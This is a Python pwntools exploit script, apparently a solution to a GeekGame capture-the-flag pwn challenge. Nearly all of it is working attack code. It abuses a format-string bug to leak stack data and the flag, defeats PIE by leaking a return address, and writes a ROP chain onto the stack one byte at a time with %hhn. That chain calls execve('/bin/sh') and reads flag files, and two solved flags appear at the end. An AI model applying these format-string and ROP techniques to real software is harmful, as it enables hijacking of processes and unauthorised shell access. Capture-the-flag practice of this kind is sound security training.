from pwn import *

context.log_level = 'debug'

conn = remote('prob09.geekgame.pku.edu.cn', 10009)
conn.sendlineafter(b'Please input your token: ', b'token')

# conn = process('c_noob/pwn')
# context.terminal = ['tmux', 'splitw', '-h']
# gdb.attach(pidof(conn)[0], 'b *$rebase(0xa390)')


# 26: local_458
leak_payload = b''.join([f'%{i}$p'.encode() for i in range(26, 35)])
# get fmt number
ret_fmt = 26 + 0x458 // 8
input_fmt = 26 + (0x458 - 0x418) // 8
print(ret_fmt, input_fmt)


conn.sendlineafter(b'Please input your instruction:\n', leak_payload)
leak_raw = conn.recvline(keepends=False)
conn.recvline()

for h in leak_raw.split(b'(nil)')[0].split(b'0x')[1:]:
    flg_pt = eval('0x' + h.decode()).to_bytes(8, 'little')
    print(flg_pt.decode(), end='')

# crack PIE
conn.sendlineafter(b'Please input your instruction:\n', f'%{ret_fmt}$p'.encode())
ret_addr = eval(conn.recvline(keepends=False).decode())
PIE = ret_addr - 0xa3fd
print(hex(PIE))

# get a stack address
conn.sendlineafter(b'Please input your instruction:\n', f'%{ret_fmt - 1}$p'.encode())
old_rbp_addr = eval(conn.recvline(keepends=False).decode())
# conn.sendlineafter(b'Please input your instruction:\n', b'AAAAAAAA' + f'%{input_fmt + 2}$s'.encode().ljust(8,b'A') + p64(old_rbp_addr - 8 - 0x418))
stack_ret_addr = old_rbp_addr - 8
input_addr = old_rbp_addr - 8 - 0x418


syscall_gadget = PIE + 0x9643
pop_rdi_rbp =  PIE + 0xbb1b
pop_rax_rdx_rbx = PIE + 0x8d9da
pop_rsi = PIE + 0x1781e
# ret = PIE + 0xa403

anywrite = lambda addr, c:  (f"%{256 + (c+0)%256}c".encode() + f"%{input_fmt + 2}$hhn".encode()).ljust(16,b'A') + p64(addr)
# write ROP after stack
ROPsc = p64(pop_rax_rdx_rbx) + p64(59) + p64(0) + p64(0) + p64(pop_rsi) + p64(0) + p64(pop_rdi_rbp) + p64(input_addr + 8) + p64(0) + p64(syscall_gadget)

for i, b in enumerate(ROPsc):
    payload = anywrite(stack_ret_addr + i, b)
    conn.sendlineafter(b'Please input your instruction:\n',payload)

# check ROP chain
check_payload = b''.join([f'%{i}$p;'.encode() for i in range(ret_fmt, ret_fmt + 20)])
conn.sendlineafter(b'Please input your instruction:\n', check_payload)

# # # partial write to trigger
final_payload = b"A"*8 + b'/bin/sh\x00'
conn.sendlineafter(b'Please input your instruction:\n', final_payload)
conn.sendlineafter(b'Please input your instruction:\n', b'exit')

conn.sendline(b'cat flag*')

conn.interactive()

# flag{Pwn_0n_STACK_tO0_siMPLe}
# flag{Re4d_PR1NTf_c0de_sO_E4zY}